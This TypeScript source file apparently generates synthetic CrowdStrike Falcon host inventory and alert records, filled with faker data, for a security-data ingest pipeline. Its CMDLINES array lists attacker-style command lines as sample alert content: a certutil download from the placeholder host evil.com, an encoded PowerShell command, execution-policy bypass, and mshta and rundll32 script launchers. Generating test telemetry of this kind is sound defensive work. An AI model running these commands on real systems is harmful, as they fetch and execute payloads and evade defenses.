/**
 * CrowdStrike Falcon Integration
 * Generates host inventory and alert/detection documents
 */

import { BaseIntegration, IntegrationDocument, DataStreamConfig } from './base_integration';
import { Organization, CorrelationMap, Employee, Device } from '../types';
import { faker } from '@faker-js/faker';
import { MALWARE_HASHES } from '../data/threat_intel_data';

/**
 * MITRE ATT&CK tactics and techniques for alerts
 */
const MITRE_ATTACKS = [
  { tactic: 'Initial Access', tacticId: 'TA0001', technique: 'Phishing', techniqueId: 'T1566' },
  {
    tactic: 'Execution',
    tacticId: 'TA0002',
    technique: 'Command and Scripting Interpreter',
    techniqueId: 'T1059',
  },
  {
    tactic: 'Persistence',
    tacticId: 'TA0003',
    technique: 'Registry Run Keys',
    techniqueId: 'T1547.001',
  },
  {
    tactic: 'Privilege Escalation',
    tacticId: 'TA0004',
    technique: 'Process Injection',
    techniqueId: 'T1055',
  },
  {
    tactic: 'Defense Evasion',
    tacticId: 'TA0005',
    technique: 'Obfuscated Files',
    techniqueId: 'T1027',
  },
  {
    tactic: 'Credential Access',
    tacticId: 'TA0006',
    technique: 'OS Credential Dumping',
    techniqueId: 'T1003',
  },
  {
    tactic: 'Discovery',
    tacticId: 'TA0007',
    technique: 'System Information Discovery',
    techniqueId: 'T1082',
  },
  {
    tactic: 'Lateral Movement',
    tacticId: 'TA0008',
    technique: 'Remote Services',
    techniqueId: 'T1021',
  },
  {
    tactic: 'Collection',
    tacticId: 'TA0009',
    technique: 'Archive Collected Data',
    techniqueId: 'T1560',
  },
  {
    tactic: 'Command and Control',
    tacticId: 'TA0011',
    technique: 'Application Layer Protocol',
    techniqueId: 'T1071',
  },
];

const ALERT_NAMES = [
  'Suspicious PowerShell Execution',
  'Malicious Document Detected',
  'Potentially Unwanted Program',
  'Credential Theft Tool Detected',
  'Suspicious Network Connection',
  'Process Injection Detected',
  'Ransomware Behavior Detected',
  'Adware/PUP Detected',
  'Unauthorized Software Installation',
  'Suspicious Script Execution',
  'Fileless Malware Detected',
  'Known Malware Hash Match',
];

const SUSPICIOUS_PROCESSES = [
  { name: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\' },
  { name: 'cmd.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'wscript.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'cscript.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'mshta.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'certutil.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'rundll32.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'regsvr32.exe', path: 'C:\\Windows\\System32\\' },
];

const CMDLINES = [
  'powershell.exe -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...',
  'cmd.exe /c whoami /all',
  'certutil.exe -urlcache -split -f http://evil.com/payload.exe',
  'wscript.exe //b //nologo C:\\Users\\Public\\update.vbs',
  'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',
  'powershell.exe -ep bypass -file C:\\temp\\script.ps1',
  'cmd.exe /c net user /domain',
  'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell"", 0")',
];

const CS_AGENT_VERSION = '7.10.18305.0';
const CS_CID = 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6';

/**
 * CrowdStrike Integration
 */
export class CrowdStrikeIntegration extends BaseIntegration {
  readonly packageName = 'crowdstrike';
  readonly displayName = 'CrowdStrike Falcon';

  readonly dataStreams: DataStreamConfig[] = [
    { name: 'host', index: 'logs-crowdstrike.host-default' },
    { name: 'alert', index: 'logs-crowdstrike.alert-default' },
  ];

  generateDocuments(
    org: Organization,
    correlationMap: CorrelationMap
  ): Map<string, IntegrationDocument[]> {
    const documentsMap = new Map<string, IntegrationDocument[]>();
    const hostDocs: IntegrationDocument[] = [];
    const alertDocs: IntegrationDocument[] = [];

    // Generate host inventory documents (one per laptop device)
    for (const [_agentId, { employee, device }] of correlationMap.crowdstrikeAgentIdToDevice) {
      // Only laptops get CrowdStrike agents (not mobile)
      if (device.type !== 'laptop') continue;

      hostDocs.push(this.generateHostDocument(employee, device));
    }

    // Generate alerts (2-5% of devices)
    const laptopEntries = [...correlationMap.crowdstrikeAgentIdToDevice.entries()].filter(
      ([, { device }]) => device.type === 'laptop'
    );
    const alertCount = Math.max(
      1,
      Math.floor(laptopEntries.length * faker.number.float({ min: 0.02, max: 0.05 }))
    );
    const alertDevices = faker.helpers.arrayElements(laptopEntries, alertCount);

    for (const [, { employee, device }] of alertDevices) {
      alertDocs.push(this.generateAlertDocument(employee, device));
    }

    documentsMap.set('logs-crowdstrike.host-default', hostDocs);
    documentsMap.set('logs-crowdstrike.alert-default', alertDocs);
    return documentsMap;
  }

  private generateHostDocument(employee: Employee, device: Device): IntegrationDocument {
    const platform = this.mapPlatform(device.platform);
    const osVersion = this.mapOsVersion(device.platform);
    const firstSeen = faker.date.past({ years: 2 }).toISOString();
    const modifiedTimestamp = this.getTimestamp();

    // Build raw CrowdStrike Falcon API host object
    // The ingest pipeline will parse this JSON and map all fields to ECS
    const rawHost = {
      device_id: device.crowdstrikeDeviceId,
      cid: CS_CID,
      hostname: `${employee.userName}-${device.platform}`,
      local_ip: faker.internet.ipv4(),
      external_ip: faker.internet.ipv4(),
      mac_address: faker.internet.mac({ separator: '-' }).toLowerCase(),
      os_version: osVersion,
      platform_name: platform,
      platform_id: this.mapPlatformId(device.platform),
      agent_version: CS_AGENT_VERSION,
      agent_local_time: this.getTimestamp(),
      status: 'normal',
      provision_status: 'Provisioned',
      serial_number: device.serialNumber,
      system_manufacturer: this.mapManufacturer(device),
      system_product_name: device.displayName,
      device_policies: {
        prevention: {
          policy_id: faker.string.uuid(),
          applied: true,
          policy_type: 'prevention',
        },
        sensor_update: {
          policy_id: faker.string.uuid(),
          applied: true,
          policy_type: 'sensor-update',
        },
        device_control: {
          policy_id: faker.string.uuid(),
          applied: true,
          policy_type: 'device-control',
        },
      },
      groups: [employee.department.replace(/ & /g, '-').toLowerCase()],
      first_seen: firstSeen,
      last_seen: this.getRandomTimestamp(2),
      modified_timestamp: modifiedTimestamp,
      product_type_desc: 'Workstation',
    };

    return {
      // @timestamp is required by IntegrationDocument type but the pipeline
      // will overwrite it from modified_timestamp
      '@timestamp': modifiedTimestamp,
      message: JSON.stringify(rawHost),
      data_stream: { namespace: 'default', type: 'logs', dataset: 'crowdstrike.host' },
      tags: ['forwarded', 'crowdstrike-host'],
    } as IntegrationDocument;
  }

  private generateAlertDocument(employee: Employee, device: Device): IntegrationDocument {
    const mitre = faker.helpers.arrayElement(MITRE_ATTACKS);
    const alertName = faker.helpers.arrayElement(ALERT_NAMES);
    const process = faker.helpers.arrayElement(SUSPICIOUS_PROCESSES);
    const cmdline = faker.helpers.arrayElement(CMDLINES);
    const severity = faker.helpers.weightedArrayElement([
      { value: 2, weight: 40 },
      { value: 3, weight: 35 },
      { value: 4, weight: 20 },
      { value: 5, weight: 5 },
    ]);
    const severityName = ['', '', 'Low', 'Medium', 'High', 'Critical'][severity];
    const sha256 = faker.helpers.arrayElement(MALWARE_HASHES);
    const prevented = severity < 5 ? faker.datatype.boolean(0.8) : faker.datatype.boolean(0.5);
    const alertTimestamp = this.getRandomTimestamp(48);
    const alertId = `ind:${device.crowdstrikeAgentId}:${faker.string.numeric(12)}-${faker.string.numeric(4)}-${faker.string.numeric(8)}`;
    const processId = faker.string.numeric(12);
    const parentProcessId = faker.string.numeric(12);

    // Build raw CrowdStrike Falcon API alert object
    // The ingest pipeline will parse this JSON and map all fields to ECS
    const rawAlert: Record<string, unknown> = {
      id: alertId,
      cid: CS_CID,
      agent_id: device.crowdstrikeAgentId,
      name: alertName,
      description: `${alertName} detected on host ${employee.userName}-${device.platform}`,
      severity: severity * 20, // CrowdStrike API uses 0-100 scale
      severity_name: severityName.toLowerCase(),
      confidence: faker.number.int({ min: 50, max: 100 }),
      tactic: mitre.tactic,
      tactic_id: mitre.tacticId,
      technique: mitre.technique,
      technique_id: mitre.techniqueId,
      device: {
        device_id: device.crowdstrikeDeviceId,
        hostname: `${employee.userName}-${device.platform}`,
        platform_name: this.mapPlatform(device.platform),
        platform_id: this.mapPlatformId(device.platform),
        os_version: this.mapOsVersion(device.platform),
        local_ip: faker.internet.ipv4(),
        external_ip: faker.internet.ipv4(),
        agent_version: CS_AGENT_VERSION,
        system_manufacturer: this.mapManufacturer(device),
        system_product_name: device.displayName,
        status: 'normal',
      },
      cmdline,
      filename: process.name,
      filepath: `\\Device\\HarddiskVolume3\\${process.path.replace(/^C:\\/, '')}${process.name}`,
      sha256,
      process_id: processId,
      process_start_time: new Date(alertTimestamp).getTime(),
      parent_details: {
        cmdline: 'C:\\WINDOWS\\Explorer.EXE',
        filename: 'explorer.exe',
        filepath: '\\Device\\HarddiskVolume3\\Windows\\explorer.exe',
        process_id: parentProcessId,
        sha256: faker.string.hexadecimal({ length: 64, casing: 'lower', prefix: '' }),
        user_name: employee.userName,
      },
      user_name: employee.userName,
      prevented: String(prevented),
      pattern_disposition: prevented ? 2048 : 0,
      pattern_disposition_description: prevented
        ? 'Prevention/Quarantine, process was blocked from execution and quarantine was attempted.'
        : 'Detection only, no preventive action taken.',
      pattern_disposition_details: {
        detect: !prevented,
        process_blocked: prevented,
        quarantine_file: prevented && faker.datatype.boolean(0.7),
        kill_process: false,
        kill_parent: false,
        kill_subprocess: false,
        operation_blocked: false,
        indicator: false,
        sensor_only: false,
        policy_disabled: false,
        kill_action_failed: false,
        blocking_unsupported_or_disabled: false,
        suspend_process: false,
        suspend_parent: false,
        quarantine_machine: false,
        rooting: false,
        critical_process_disabled: false,
        fs_operation_blocked: false,
        handle_operation_downgraded: false,
        bootup_safeguard_enabled: false,
        inddet_mask: false,
        registry_operation_blocked: false,
      },
      timestamp: alertTimestamp,
      created_timestamp: alertTimestamp,
      updated_timestamp: this.getTimestamp(),
      status: 'new',
      scenario: 'NGAV',
      product: 'epp',
      objective: 'FalconDetectionMethod',
      show_in_ui: true,
      data_domains: ['Endpoint'],
      source_products: ['FalconInsight'],
      source_vendors: ['CrowdStrike'],
    };

    return {
      // @timestamp is required by IntegrationDocument type but the pipeline
      // will overwrite it from timestamp
      '@timestamp': alertTimestamp,
      message: JSON.stringify(rawAlert),
      data_stream: { namespace: 'default', type: 'logs', dataset: 'crowdstrike.alert' },
      tags: ['forwarded', 'crowdstrike-alert'],
    } as IntegrationDocument;
  }

  private mapPlatform(platform: string): string {
    const map: Record<string, string> = { mac: 'Mac', windows: 'Windows', linux: 'Linux' };
    return map[platform] || platform;
  }

  private mapPlatformId(platform: string): string {
    const map: Record<string, string> = { mac: '1', windows: '0', linux: '3' };
    return map[platform] || '0';
  }

  private mapOsVersion(platform: string): string {
    const map: Record<string, string> = { mac: '14.2.1', windows: '10.0.22621', linux: '6.5.0' };
    return map[platform] || '1.0';
  }

  private mapManufacturer(device: Device): string {
    if (device.platform === 'mac') return 'Apple Inc.';
    if (device.displayName.includes('Dell')) return 'Dell Inc.';
    if (device.displayName.includes('Lenovo')) return 'Lenovo';
    if (device.displayName.includes('HP')) return 'HP Inc.';
    if (device.displayName.includes('Surface')) return 'Microsoft Corporation';
    if (device.displayName.includes('System76')) return 'System76';
    return 'Unknown';
  }
}
